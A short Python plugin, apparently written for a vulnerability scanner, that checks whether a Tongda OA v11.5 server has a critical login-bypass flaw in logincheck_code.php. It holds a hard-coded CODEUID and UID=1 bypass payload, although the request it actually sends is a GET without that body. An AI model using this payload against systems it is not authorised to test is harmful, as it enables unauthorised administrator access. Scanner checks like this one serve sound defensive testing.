#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '通达OA v11.5 logincheck_code.php 登陆绕过',

      'level'     :   'critical',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/general/login_code.php'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and 'image/png' in res.headers['content-type']:
      res.close()
  except:
    return ret
  try:
    data = 'CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D&UID=1'
    headers['Content-Type'] ='application/x-www-form-urlencoded'
    headers['Accept-Encoding'] = 'gzip'
    resp = requests.get(url=url+'/logincheck_code.php',headers=headers,timeout=5,verify=False)
    if resp.status_code == 200 and re.search(r'status.*?msg.*?url.*?index.php*?isIE=0',resp.text,re.S):
      resp.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret